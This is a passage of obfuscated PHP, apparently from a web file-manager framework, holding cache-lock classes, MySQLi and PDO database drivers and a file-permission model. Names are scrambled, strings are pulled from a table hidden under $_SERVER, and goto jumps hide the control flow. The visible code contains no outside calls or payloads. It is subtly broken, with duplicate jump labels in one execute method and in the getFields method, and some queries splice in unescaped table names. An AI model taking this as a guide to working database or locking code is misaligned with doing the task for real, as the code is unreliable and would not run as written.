isset($e [$Dф[1917]]) ? $e [$Dф[1917]] : $Dф[33]; $c۲[$Dф[1398]] = isset($d[$Eّ]) ? $d[$Eّ] : $Dņ; goto Eˎ; fͽ: } $this->clearSystemPathLog($D䅛); goto e͈; e͈: return $dƘ; goto Bʶ; f: $Fҍ = $this->getSourceList($B܌); $d = $this->typeAll(); $dƘ = array(); goto b; E: $Dф =& $_SERVER[Ť]; $F = array_to_keyvalue($B܌, $Dф[33], $Dф[1493]); $A = Model($Dф[494])->userListInfo(array_unique($F)); goto f; Bʶ: } private function clearSystemPathLog($d) { $b =& $_SERVER[Ť]; if (count($d) == 0) { return; } $dۛ = array($b[383] => array($b[7], array_unique($d))); $this->where($dۛ)->delete(); } public function deviceList($fȨ, $f석 = 0) { $C畆 =& $_SERVER[Ť]; $cֲ = array($C畆[1493] => $fȨ, $C畆[190] => array($C畆[942], $f석), $C畆[29] => $C畆[1591]); $c = array(); $a׫ = $this->field($C畆[2054])->where($cֲ)->order($C畆[1878])->limit(50)->select(); foreach ($a׫ as $aʄ => $fڜ) { goto dƟ翮; dƟ翮: if ($aʄ > 0 && abs($fڜ[$C畆[190]] - $a׫[$aʄ - 1][$C畆[190]]) < 5) { continue; } $aʭ = json_decode($fڜ[$C畆[421]], !0); $fڜ[$C畆[2046]] = isset($aʭ[$C畆[2046]]) ? $aʭ[$C畆[2046]] : $C畆[33]; goto Fڄ; Fڄ: unset($aʭ[$C畆[2046]]); $E㄄ = $this->deviceType($aʭ[$C畆[1869]]); if (isset($c[$E㄄])) { continue; } goto f殌; f殌: $this->ipAddress($fڜ); $fڜ[$C畆[421]] = $aʭ; $c[$E㄄] = $fڜ; goto D˧; D˧: } return array_values($c); } public function deviceType($A₂) { return $A₂; } } goto B; c󤨿: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $e﹑܋ =& $_SERVER[Ť]; $CՐ = $GLOBALS[$e﹑܋[6]][$e﹑܋[343]]; self::$cachePath = $CՐ[$e﹑܋[171]][$e﹑܋[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($DɄ, $b턃 = 0) { goto bݷܡ; BԈڛԹ: $this->unlock($DɄ); return !1; goto AǪ; a: $a轼 = rtrim(self::$cachePath, $aۇ[8]) . $aۇ[796] . md5($DɄ) . $aۇ[793]; if (file_exists($a轼) && filemtime($a轼) && filemtime($a轼) < time() - 10) { @unlink($a轼); } do { if (file_exists($a轼)) { cacheLockWait(); continue; } $A؍ = fopen($a轼, $aۇ[797]); if (!$A؍) { return !1; } $b℩ڋ = flock($A؍, LOCK_EX | LOCK_NB); self::$caches[$DɄ] = array($aۇ[798] => $A؍, $aۇ[171] => $a轼); fwrite($A؍, $B); clearstatcache(); if ($A؍ && $b℩ڋ) { return !0; } cacheLockWait(); } while (microtime(!0) < $B); goto BԈڛԹ; bݷܡ: $aۇ =& $_SERVER[Ť]; $F˕ = microtime(!0); $B = $F˕ + $b턃 + 0.0001; goto a; AǪ: } public function lockGet($fւҬ) { $e =& $_SERVER[Ť]; $f = rtrim(self::$cachePath, $e[8]) . $e[796] . md5($fւҬ) . $e[793]; return file_exists($f); } public function unlock($A򏣽) { goto dؽ߾ߚ; Cᘬ: @flock($F[$a³Ԛ[798]], LOCK_UN); @fclose($F[$a³Ԛ[798]]); @unlink($F[$a³Ԛ[171]]); goto cџĢ; dؽ߾ߚ: $a³Ԛ =& $_SERVER[Ť]; $F = self::$caches[$A򏣽]; if (!$F) { return; } goto Cᘬ; cџĢ: unset(self::$caches[$A򏣽]); goto B; B: } } class CacheLockRedis { public function lock($eю, $E¤ = 10) { $C = Cache::init(); $c = microtime(!0) + $E¤; while (microtime(!0) < $c) { $B竊ʾ = $C->get($eю); if (!$B竊ʾ) { $a餰 = $C->setLock($eю, $c, $E¤); if ($a餰) { return !0; } } else { if ($B竊ʾ < microtime(!0)) { $C->set($eю, $c, $c); if ($C->get($eю) === $B竊ʾ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ḟ) { return Cache::init()->get($Ḟ); } public function unlock($b؄) { return Cache::init()->remove($b؄); } } class CacheLockMemcached { public function lock($e٤, $DГ = 0) { $D = Cache::init(); $e鐲 = microtime(!0) + $DГ; while (microtime(!0) < $e鐲) { $Cμ = $D->get($e٤); if (!$Cμ || $Cμ < microtime(!0)) { $e튍 = $D->handle->add($e٤, $e鐲, $DГ); if ($e튍) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($DƗЌ) { return Cache::init()->get($DƗЌ); } public function unlock($f߃) { return Cache::init()->remove($f߃); } } goto Bȅ; FϺ: class DbMysqli extends Db { public function __construct($B = '') { $DȐߣո =& $_SERVER[Ť]; if (!extension_loaded($DȐߣո[743])) { think_exception(think_lang($DȐߣո[10]) . $DȐߣո[843]); } if (!empty($B)) { $this->config = $B; if (empty($this->config[$DȐߣո[13]])) { $this->config[$DȐߣո[13]] = $DȐߣո[33]; } } } public function connect($cӲ = '', $B = 0) { $e힦փ =& $_SERVER[Ť]; if (!isset($this->linkID[$B])) { goto aٲɜ; aٲɜ: if (empty($cӲ)) { $cӲ = $this->config; } $this->linkID[$B] = new mysqli($cӲ[$e힦փ[817]], $cӲ[$e힦փ[819]], $cӲ[$e힦փ[820]], $cӲ[$e힦փ[17]], $cӲ[$e힦փ[818]] ? intval($cӲ[$e힦փ[818]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto EÇ; EÇ: $bԨߐ = $this->linkID[$B]->server_version; $this->linkID[$B]->query($e힦փ[821] . think_config($e힦փ[822]) . $e힦փ[55]); if ($bԨߐ > $e힦փ[823]) { $this->linkID[$B]->query($e힦փ[824]); } goto dً; dً: $this->connected = !0; if (1 != think_config($e힦փ[18])) { unset($this->config); } goto Eќ; Eќ: } return $this->linkID[$B]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($aҧ֤) { goto ḍ; ḍ: $C =& $_SERVER[Ť]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto f; B: think_status($C[20]); $this->queryID = $this->_linkID->query($aҧ֤); if ($this->_linkID->more_results()) { while (($a񊉆 = $this->_linkID->next_result()) != NULL) { $a񊉆->free_result(); } } goto bҫѢ; f: $this->queryStr = $aҧ֤; if ($this->queryID) { $this->free(); } think_action_status($C[19], 1); goto B; bҫѢ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto a; a: } public function execute($Bϳ) { goto A┐; Dą: $this->queryStr = $Bϳ; if ($this->queryID) { $this->free(); } think_action_status($A[21], 1); goto f; f: think_status($A[20]); $BĢ = $this->_linkID->query($Bϳ); $this->debug(); goto f; A┐: $A =& $_SERVER[Ť]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Dą; f: if (!1 === $BĢ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto aގ; aގ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $a = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$a) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $F͖ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$F͖) { $this->error(); return !1; } } return !0; } private function getAll() { $d۫ = array(); if ($this->numRows > 0) { for ($dЧ = 0; $dЧ < $this->numRows; $dЧ++) { $d۫[$dЧ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $d۫; } public function getFields($e먎) { $Dƌ =& $_SERVER[Ť]; $e׃۷ = $this->query($Dƌ[828] . $this->parseKey($e먎)); $fі = array(); if ($e׃۷) { foreach ($e׃۷ as $AǮ፿ => $e䑒) { $fі[$e䑒[$Dƌ[27]]] = array($Dƌ[28] => $e䑒[$Dƌ[27]], $Dƌ[29] => $e䑒[$Dƌ[30]], $Dƌ[31] => (bool) ($e䑒[$Dƌ[32]] === $Dƌ[33]), $Dƌ[34] => $e䑒[$Dƌ[35]], $Dƌ[36] => strtolower($e䑒[$Dƌ[37]]) == $Dƌ[38], $Dƌ[39] => strtolower($e䑒[$Dƌ[40]]) == $Dƌ[41]); } } return $fі; } public function getTables($Aݼ = '') { $F =& $_SERVER[Ť]; $b = !empty($Aݼ) ? $F[830] . $Aݼ . $F[831] : $F[832]; $b݋ = $this->query($b); $fލ = array(); if ($b݋) { foreach ($b݋ as $Bۧ => $B顕) { $fލ[$Bۧ] = current($B顕); } } return $fލ; } public function replace($F艳, $d = array()) { $Fޞ =& $_SERVER[Ť]; foreach ($F艳 as $d㽗 => $bڠ⻕) { $aϣγ = $this->parseValue($bڠ⻕); if (is_scalar($aϣγ)) { $aу[] = $aϣγ; $B[] = $this->parseKey($d㽗); } } $eܘ҆ = $Fޞ[833] . $this->parseTable($d[$Fޞ[273]]) . $Fޞ[834] . implode($Fޞ[47], $B) . $Fޞ[835] . implode($Fޞ[47], $aу) . $Fޞ[836]; return $this->execute($eܘ҆); } public function insertAll($fǆ, $BԌ = array(), $fԛ = false) { goto C; Eβ: $AÈ = ($fԛ ? $CԔ[838] : $CԔ[839]) . $CԔ[840] . $this->parseTable($BԌ[$CԔ[273]]) . $CԔ[834] . implode($CԔ[47], $AҪݰ) . $CԔ[841] . implode($CԔ[47], $C); return $this->execute($AÈ); goto cӔԐ; C: $CԔ =& $_SERVER[Ť]; if (!is_array($fǆ[0])) { return !1; } $AҪݰ = array_keys($fǆ[0]); goto fܵ; fܵ: $C = array(); foreach ($fǆ as $Eߩ∲) { $bگ = array(); foreach ($Eߩ∲ as $dʰ => $f) { $f = $this->parseValue($f); if (is_scalar($f)) { $bگ[] = $f; } } $C[] = $CԔ[254] . implode($CԔ[47], $bگ) . $CԔ[836]; } array_walk($AҪݰ, array($this, $CԔ[837])); goto Eβ; cӔԐ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Cəؖڌ =& $_SERVER[Ť]; $this->error = $this->_linkID->errno . $Cəؖڌ[4] . $this->_linkID->error; if ($Cəؖڌ[33] != $this->queryStr) { $this->error .= LNG($Cəؖڌ[45]) . $this->queryStr; } think_trace($this->error, $Cəؖڌ[33], $Cəؖڌ[46]); return $this->error; } public function escapeString($aǿ۝) { if ($this->_linkID) { return $this->_linkID->real_escape_string($aǿ۝); } else { return addslashes($aǿ۝); } } public function parseKey(&$C֟, $B = true) { $d𥌤 =& $_SERVER[Ť]; if ($B) { $C֟ = $this->parseKeyCheck($C֟); } if ($C֟ != $d𥌤[180] && !preg_match($d𥌤[842], $C֟)) { $C֟ = $d𥌤[375] . trim($C֟, $d𥌤[375]) . $d𥌤[375]; } return $C֟; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($F· = '') { $a׊Ю =& $_SERVER[Ť]; if (!class_exists($a׊Ю[844])) { think_exception(think_lang($a׊Ю[10]) . $a׊Ю[845]); } if (!empty($F·)) { $this->config = $F·; if (empty($this->config[$a׊Ю[13]])) { $this->config[$a׊Ю[13]] = array(); } } } public function connect($eƗ = '', $dߟ = 0) { $CȬ֍ɼ =& $_SERVER[Ť]; if (!isset($this->linkID[$dߟ])) { goto c䫰͗; Fͥ: if (!$this->linkID[$dߟ]) { think_exception($CȬ֍ɼ[854]); } try { $this->linkID[$dߟ]->exec($CȬ֍ɼ[855] . think_config($CȬ֍ɼ[822])); } catch (Exception $Cڂ) { } $this->connected = !0; goto a҇; E: try { $this->linkID[$dߟ] = new PDO($eƗ[$CȬ֍ɼ[846]], $eƗ[$CȬ֍ɼ[819]], $eƗ[$CȬ֍ɼ[820]], $eƗ[$CȬ֍ɼ[13]]); } catch (PDOException $Cڂ) { think_exception($Cڂ->getMessage()); } $this->dbType = $this->_getDsnType($eƗ[$CȬ֍ɼ[846]]); if (in_array($this->dbType, array($CȬ֍ɼ[847], $CȬ֍ɼ[848], $CȬ֍ɼ[849], $CȬ֍ɼ[850]))) { think_exception($CȬ֍ɼ[851] . $this->dbType . $CȬ֍ɼ[852] . $this->dbType . $CȬ֍ɼ[853]); } goto Fͥ; c䫰͗: if (empty($eƗ)) { $eƗ = $this->config; } $c = !empty($eƗ[$CȬ֍ɼ[13]][$CȬ֍ɼ[14]]) ? $eƗ[$CȬ֍ɼ[13]][$CȬ֍ɼ[14]] : $this->pconnect; if ($c) { $eƗ[$CȬ֍ɼ[13]][PDO::ATTR_PERSISTENT] = !0; } goto E; a҇: if (1 != think_config($CȬ֍ɼ[18])) { unset($this->config); } goto dޟ; dޟ: } return $this->linkID[$dߟ]; } public function free() { $this->PDOStatement = null; } public function query($D, $dܕ = array()) { goto Aꈨ; Cʛ: $this->queryStr = $D; if (!empty($dܕ)) { $this->queryStr .= $bͳΣ[856] . print_r($dܕ, !0) . $bͳΣ[857]; } if (!empty($this->PDOStatement)) { $this->free(); } goto f֮; Fө: if (!1 === $b䗞) { $this->error(); return !1; } else { return $this->getAll(); } goto F愈; Aꈨ: $bͳΣ =& $_SERVER[Ť]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Cʛ; f֮: think_action_status($bͳΣ[19], 1); think_status($bͳΣ[20]); $this->PDOStatement = $this->_linkID->prepare($D); goto D; D: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $b䗞 = $this->PDOStatement->execute($dܕ); $this->debug(); goto Fө; F愈: } public function execute($Dѱ, $aՇ = array()) { goto Eܲ; Eܲ: $C =& $_SERVER[Ť]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E҈; E҈: $this->queryStr = $Dѱ; if (!empty($aՇ)) { $this->queryStr .= $C[856] . print_r($aՇ, !0) . $C[857]; } $E = !1; goto A񬕯; FʍÌ: $eǨ֜ = $this->PDOStatement->execute($aՇ); $this->debug(); if (!1 === $eǨ֜) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($E || preg_match($C[862], $Dѱ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto EＣ; F꤃: think_status($C[20]); $this->PDOStatement = $this->_linkID->prepare($Dѱ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto FʍÌ; A񬕯: if ($this->dbType == $C[850]) { if (preg_match($C[858], $this->queryStr, $a݈ቮ)) { $this->table = think_config($C[859]) . str_ireplace(think_config($C[860]), $C[368], $a݈ቮ[2]); $E = (bool) $this->query($C[861] . strtoupper($this->table) . $C[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($C[21], 1); goto F꤃; EＣ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e = $this->_linkID->commit(); $this->transTimes = 0; if (!$e) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Cć = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Cć) { $this->error(); return !1; } } return !0; } private function getAll() { $DՉ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($DՉ); return $DՉ; } public function getFields($D) { goto a; a: $A =& $_SERVER[Ť]; $this->initConnect(!0); if (think_config($A[863])) { $e = str_replace($A[864], $D, think_config($A[863])); } else { switch ($this->dbType) { case $A[847]: case $A[865]: $e = "\x53\x45\114\x45\103\x54\40\x20\x20\x63\157\154\165\x6d\x6e\x5f\x6e\141\155\145\x20\x61\163\40\47\x4e\141\x6d\145\x27\x2c\x20\40\40\x64\141\164\141\137\x74\171\160\145\x20\141\163\40\x27\124\171\x70\x65\47\x2c\x20\x20\40\x63\x6f\154\165\155\x6e\137\x64\145\146\141\165\154\164\x20\x61\x73\x20\47\104\145\x66\x61\x75\x6c\x74\x27\x2c\40\x20\x20\x69\163\137\156\x75\154\x6c\141\x62\x6c\x65\x20\x61\163\40\47\116\x75\154\x6c\47\12\x9\x9\x46\122\117\115\11\x69\x6e\146\157\x72\155\141\164\x69\157\156\137\163\x63\x68\145\155\x61\56\x74\x61\x62\154\145\163\40\x41\123\40\164\12\x9\11\112\117\x49\x4e\x9\151\x6e\x66\157\162\x6d\x61\164\x69\x6f\156\137\x73\x63\x68\x65\x6d\x61\56\x63\157\x6c\x75\155\156\x73\40\101\x53\40\143\12\x9\x9\x4f\x4e\x20\40\x74\56\x74\141\x62\x6c\x65\x5f\x63\141\164\141\x6c\157\147\40\75\x20\143\56\x74\x61\142\x6c\x65\137\143\141\164\x61\x6c\157\x67\xa\11\11\101\x4e\x44\x20\x74\x2e\164\x61\142\x6c\x65\137\163\x63\x68\145\155\141\x20\75\40\x63\56\164\141\142\x6c\145\x5f\x73\x63\x68\x65\155\141\xa\11\11\101\x4e\x44\x20\164\56\x74\x61\142\154\145\137\156\x61\x6d\x65\40\x3d\40\x63\x2e\164\141\142\154\x65\137\x6e\x61\155\x65\xa\11\11\x57\110\105\122\x45\40\x20\x20\x74\56\164\141\142\x6c\x65\137\156\141\155\x65\x20\75\x20\x27{$D}\x27"; break; case $A[866]: $e = $A[867] . $D . $A[868]; break; case $A[848]: case $A[850]: $e = $A[869] . $A[870] . $A[871] . strtoupper($D) . $A[872] . strtoupper($D) . $A[873]; break; case $A[874]: $e = $A[875] . $D . $A[876]; break; case $A[849]: break; case $A[877]: default: $e = $A[878] . ($this->dbType == $A[877] ? "\x60{$D}\x60" : $D); } } goto dע; a: return $c; goto Bƣ; dע: $f؋ = $this->query($e); $c = array(); if ($f؋) { foreach ($f؋ as $B => $dу) { $dу = array_change_key_case($dу); $dу[$A[28]] = isset($dу[$A[28]]) ? $dу[$A[28]] : $A[368]; $dу[$A[29]] = isset($dу[$A[29]]) ? $dу[$A[29]] : $A[368]; $EДЃ = isset($dу[$A[267]]) ? $dу[$A[267]] : $dу[$A[28]]; $c[$EДЃ] = array($A[28] => $EДЃ, $A[29] => $dу[$A[29]], $A[31] => (bool) (isset($dу[$A[99]]) && $dу[$A[99]] === $A[33] || isset($dу[$A[31]]) && $dу[$A[31]] === $A[33]), $A[34] => isset($dу[$A[34]]) ? $dу[$A[34]] : (isset($dу[$A[53]]) ? $dу[$A[53]] : $A[368]), $A[36] => isset($dу[$A[89]]) ? strtolower($dу[$A[89]]) == $A[38] : (isset($dу[$A[54]]) ? $dу[$A[54]] : !1), $A[39] => isset($dу[$A[879]]) ? strtolower($dу[$A[879]]) == $A[41] : (isset($dу[$A[89]]) ? $dу[$A[89]] : !1)); } } goto a; Bƣ: } public function getTables($d҆ǚ = '') { $Cݻ肖 =& $_SERVER[Ť]; if (think_config($Cݻ肖[880])) { $Aњ = str_replace($Cݻ肖[881], $d҆ǚ, think_config($Cݻ肖[880])); } else { switch ($this->dbType) { case $Cݻ肖[848]: case $Cݻ肖[850]: $Aњ = $Cݻ肖[882]; break; case $Cݻ肖[847]: case $Cݻ肖[865]: $Aњ = $Cݻ肖[883]; break; case $Cݻ肖[874]: $Aњ = $Cݻ肖[884]; break; case $Cݻ肖[849]: think_exception(think_lang($Cݻ肖[885]) . $Cݻ肖[886]); break; case $Cݻ肖[866]: $Aњ = $Cݻ肖[42] . $Cݻ肖[43] . $Cݻ肖[44]; break; case $Cݻ肖[877]: default: if (!empty($d҆ǚ)) { $Aњ = $Cݻ肖[830] . $d҆ǚ . $Cݻ肖[831]; } else { $Aњ = $Cݻ肖[832]; } } } $c݇ = $this->query($Aњ); $Aߋ = array(); foreach ($c݇ as $bӿۍߔ => $dȵ) { $Aߋ[$bӿۍߔ] = current($dȵ); } return $Aߋ; } protected function parseLimit($c) { $aٍڼ =& $_SERVER[Ť]; $Eׄ = $aٍڼ[33]; if (!empty($c)) { switch ($this->dbType) { case $aٍڼ[874]: case $aٍڼ[866]: $c = explode($aٍڼ[47], $c); if (count($c) > 1) { $Eׄ .= $aٍڼ[48] . $c[1] . $aٍڼ[49] . $c[0] . $aٍڼ[50]; } else { $Eׄ .= $aٍڼ[48] . $c[0] . $aٍڼ[50]; } break; case $aٍڼ[847]: case $aٍڼ[865]: break; case $aٍڼ[849]: break; case $aٍڼ[848]: case $aٍڼ[850]: break; case $aٍڼ[877]: default: $Eׄ .= $aٍڼ[48] . $c . $aٍڼ[50]; } } return $Eׄ; } public function parseKey(&$Cˬ, $Fֈ = true) { $cɽ =& $_SERVER[Ť]; if ($Fֈ) { $Cˬ = $this->parseKeyCheck($Cˬ); } if ($this->dbType == $cɽ[877]) { if ($Cˬ != $cɽ[180] && !preg_match($cɽ[842], $Cˬ)) { $Cˬ = $cɽ[375] . trim($Cˬ, $cɽ[375]) . $cɽ[375]; } return $Cˬ; } else { return parent::parseKey($Cˬ); } } public function close() { $this->_linkID = null; } public function error() { $CժÃ =& $_SERVER[Ť]; if ($this->PDOStatement) { $cщś = $this->PDOStatement->errorInfo(); $this->error = $cщś[1] . $CժÃ[4] . $cщś[2]; } else { $this->error = $CժÃ[33]; } if ($CժÃ[33] != $this->queryStr) { $this->error .= LNG($CժÃ[45]) . $this->queryStr; } think_trace($this->error, $CժÃ[33], $CժÃ[46]); return $this->error; } public function escapeString($fƶ) { $d =& $_SERVER[Ť]; switch ($this->dbType) { case $d[874]: case $d[847]: case $d[865]: case $d[877]: return addslashes($fƶ); case $d[849]: case $d[866]: case $d[848]: case $d[850]: return str_ireplace($d[55], $d[56], $fƶ); } } protected function parseValue($B⺮) { $B˖ =& $_SERVER[Ť]; if (is_string($B⺮)) { $B⺮ = strpos($B⺮, $B˖[4]) === 0 ? $this->escapeString($B⺮) : $B˖[887] . $this->escapeString($B⺮) . $B˖[887]; } elseif (isset($B⺮[0]) && is_string($B⺮[0]) && strtolower($B⺮[0]) == $B˖[291]) { $B⺮ = $this->escapeString($B⺮[1]); } elseif (is_array($B⺮)) { $B⺮ = array_map(array($this, $B˖[888]), $B⺮); } elseif (is_bool($B⺮)) { $B⺮ = $B⺮ ? $B˖[83] : $B˖[485]; } elseif (is_null($B⺮)) { $B⺮ = $B˖[99]; } return $B⺮; } public function getLastInsertId() { $D =& $_SERVER[Ť]; switch ($this->dbType) { case $D[874]: case $D[866]: case $D[847]: case $D[865]: case $D[849]: case $D[877]: return $this->_linkID->lastInsertId(); case $D[848]: case $D[850]: $DҸ = $this->table; $a = $this->query("\123\x45\114\105\103\124\40{$DҸ}\x2e\x63\x75\162\162\166\141\x6c\40\x63\165\x72\162\x76\x61\154\x20\x46\122\117\115\x20\144\x75\141\x6c"); return $a ? $a[0][$D[889]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($C) { $FƱ =& $_SERVER[Ť]; if (!CacheLock::fileLock($FƱ[9])) { return !1; } $A˹ = parent::query($C); CacheLock::fileUnLock($FƱ[9]); return $A˹; } public function execute($B) { $Bǚߢ =& $_SERVER[Ť]; if (!CacheLock::fileLock($Bǚߢ[9])) { return !1; } $D׹ = parent::execute($B); CacheLock::fileUnLock($Bǚߢ[9]); return $D׹; } } goto A䖼; a݋ۢ: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\162\x63\x65\x5f\x61\x75\x74\150"; public function getAuth($b놮) { goto b÷Ө; cۍ: return $B; goto Cѿ; b÷Ө: $aҕ =& $_SERVER[Ť]; $B膲 = $aҕ[1820]; $fΩȣ = array($aҕ[385] => $b놮); goto fц﯍Ӻ; fц﯍Ӻ: $E = $this->field($B膲)->order($aҕ[383])->where($fΩȣ)->select(); $B = array(); $CӸ = array(); goto f肊是; f肊是: $Cŋ = 2 << 25; foreach ($E as $D) { goto bԍ; a۪: if ($D[$aҕ[387]] == SourceModel::TYPE_USER && $D[$aҕ[473]] == $aҕ[485]) { $aѻ = 0; } $CӸ[] = $eԌʐ[$aҕ[392]] + $aѻ; goto cʣ; B艍Ǵ: $aѻ = 0; if ($D[$aҕ[387]] == SourceModel::TYPE_GROUP) { $aѻ = $Cŋ * 2; } if ($D[$aҕ[387]] == SourceModel::TYPE_USER) { $aѻ = $Cŋ; } goto a۪; bԍ: $eԌʐ = Model($aҕ[1821])->listData($D[$aҕ[1801]]); if (!$eԌʐ) { continue; } $B[] = $D; goto B艍Ǵ; cʣ: } array_multisort($CӸ, SORT_DESC, $B); goto cۍ; Cѿ: } public function setAuth($dꋗ, $E) { goto A; e޷: if ($d[$cČ[387]] != SourceModel::TYPE_GROUP) { return !1; } $cі = 1; $dɚÅ = $d[$cČ[473]]; goto D⏑; D⏑: if ($dɚÅ != $cі) { $A = array($cČ[1652] => $dɚÅ); $b͡ = Model($cČ[1735])->field($cČ[1493])->where($A)->select(); $b͡ = array_to_keyvalue($b͡, $cČ[33], $cČ[1493]); } $Bѷό = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $FҰ = array(); goto a; A: $cČ =& $_SERVER[Ť]; $d = Model($cČ[1172])->sourceInfo($dꋗ); if (!$d) { return !1; } goto e޷; a: foreach ($E as $fі) { if (!in_array($fі[$cČ[387]], $Bѷό)) { show_json(LNG($cČ[1822]), !1); } if ($dɚÅ != $cі) { if ($fі[$cČ[387]] == SourceModel::TYPE_GROUP) { } if ($fі[$cČ[473]] != 0 && !in_array($fі[$cČ[473]], $b͡)) { } } if ($fі[$cČ[473]] == 0) { $fі[$cČ[387]] = SourceModel::TYPE_USER; } $FҰ[] = array($cČ[385] => $dꋗ, $cČ[387] => intval($fі[$cČ[387]]), $cČ[473] => intval($fі[$cČ[473]]), $cČ[1801] => intval($fі[$cČ[1801]]) ? intval($fі[$cČ[1801]]) : 0, $cČ[1802] => intval($fі[$cČ[1802]]) ? intval($fі[$cČ[1802]]) : -1); } $this->where(array($cČ[399] => $dꋗ))->delete(); $this->addAll($FҰ); goto C֎; C֎: return !0; goto A튉ՙ; A튉ՙ: } public function authClear($EˆϞؼ) { $f̩Ӷ =& $_SERVER[Ť]; $B飭 = Model($f̩Ӷ[1172])->sourceInfo($EˆϞؼ); $E = array($EˆϞؼ); if ($B飭[$f̩Ӷ[386]] == $f̩Ӷ[83]) { $B = array($f̩Ӷ[542] => array($f̩Ӷ[500], $B飭[$f̩Ӷ[476]] . $EˆϞؼ . $f̩Ӷ[501])); $E = Model($f̩Ӷ[1172])->field($f̩Ӷ[399])->where($B)->getField($f̩Ӷ[385], !0); $E[] = $EˆϞؼ; } $this->where(array($f̩Ӷ[399] => array($f̩Ӷ[400], $E)))->delete(); return !0; } public function getAllChildren($E) { goto c; a닟: if (!$d󽂍) { return array(); } $f̈ = $bՎ[1823]; $A܃ = array($bՎ[385] => array($bՎ[7], $d󽂍), $bՎ[413] => $bՎ[485]); goto d; d: $BϳѰ = Model($bՎ[768])->field($f̈)->where($A܃)->select(); $fתЊ = array($E); foreach ($BϳѰ as $DиЖ) { foreach ($cϲɘ as $DĆ) { $Aҏ = $bՎ[47] . $DĆ . $bՎ[47]; $Bʘ = $DиЖ[$bՎ[476]] . $DиЖ[$bՎ[385]] . $bՎ[47]; if (strstr($Bʘ, $Aҏ)) { $fתЊ[] = $DиЖ[$bՎ[385]]; break; } } } goto cĵ; Dь: if ($d։[$bՎ[478]] == $bՎ[485] && $d։[$bՎ[473]] != $D琾) { $cϲɘ = $this->groupChidldAllRootSource($d։[$bՎ[473]]); } $d󽂍 = $this->field($bՎ[385])->group($bՎ[385])->select(); $d󽂍 = array_to_keyvalue($d󽂍, $bՎ[33], $bՎ[385]); goto a닟; A呔: if ($d։[$bՎ[387]] != SourceModel::TYPE_GROUP) { return array(); } $D琾 = 1; $cϲɘ = array($E); goto Dь; cĵ: return $this->sourceListAuth($fתЊ); goto C􊗾; c: $bՎ =& $_SERVER[Ť]; $d։ = Model($bՎ[1172])->sourceInfo($E); if ($d։[$bՎ[386]] != $bՎ[83]) { return $this->sourceListAuth(array($E)); } goto A呔; C􊗾: } private function sourceListAuth($e߆Ϋ) { goto c; eʘ: $B = $this->field($fʟ)->where(array($b[385] => array($b[7], $e߆Ϋ)))->select(); $cꛐ = array_to_keyvalue_group($B, $b[385]); $D = array(); goto E툐; c: $b =& $_SERVER[Ť]; $E뒌Ǵ = Model($b[1172])->sourceListInfo($e߆Ϋ, !0); $fʟ = $b[1820]; goto eʘ; E: return $D; goto d; E툐: $F = array(); foreach ($E뒌Ǵ as $Cִ) { goto aᜃ; a: $cިЄ = count(explode($b[8], trim($Cִ[$b[483]], $b[8]))); $F[] = $cިЄ + ($Cִ[$b[29]] == $b[76] ? 0 : 1000); goto E; D: $Cִ[$b[1824]] = $this->authTargetInfo($Cԫ); $Cִ[$b[483]] = rtrim($Cִ[$b[479]], $b[8]) . $b[8] . ltrim($Cִ[$b[483]], $b[8]); $D[] = $Cִ; goto a; aᜃ: unset($Cִ[$b[395]]); unset($Cִ[$b[394]]); unset($Cִ[$b[392]]); goto b; b: unset($Cִ[$b[407]]); $Cԫ = $cꛐ[$Cִ[$b[385]]]; if (!$Cԫ) { continue; } goto D; E: } array_multisort($F, SORT_ASC, $D); goto E; d: } private function groupChidldAllRootSource($bի܃) { $EԩϤ =& $_SERVER[Ť]; $Eۇ = Model($EԩϤ[1825])->groupChildrenAll($bի܃); $EׅޣƯ = array($EԩϤ[478] => 0, $EԩϤ[473] => array($EԩϤ[7], $Eۇ), $EԩϤ[387] => SourceModel::TYPE_GROUP); $c󷐃 = Model($EԩϤ[768])->field($EԩϤ[385])->where($EׅޣƯ)->select(); $c󷐃 = array_to_keyvalue($c󷐃, $EԩϤ[33], $EԩϤ[385]); return $c󷐃; } private function authTargetInfo($Bȋ) { goto B; B: $bዢ۟ =& $_SERVER[Ť]; $dɬ = array(); $e՘ = array(); goto F䗒; F䗒: $B = 2 << 25; foreach ($Bȋ as $F˳) { goto C; DЛ⽃: if (!$c霞) { 